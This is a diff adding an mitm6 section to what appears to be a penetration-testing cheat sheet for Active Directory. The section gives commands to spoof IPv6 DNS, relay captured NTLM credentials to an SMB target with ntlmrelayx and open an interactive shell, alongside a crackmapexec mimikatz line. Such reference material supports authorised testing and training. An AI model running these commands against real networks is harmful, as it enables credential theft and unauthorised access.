@@ -64,6 +64,18 @@
   crackmapexec mimikatz --server http --server-port 80
   ```
 
+* [Mitm6](https://github.com/fox-it/mitm6.git)
+
+  ```bash
+  git clone https://github.com/fox-it/mitm6.git && cd mitm6
+  pip install .
+  mitm6 -d lab.local
+  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
+  # -wh: Server hosting WPAD file (Attacker’s IP)
+  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
+  # -i: open an interactive shell
+  ```
+
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
   ```powershell
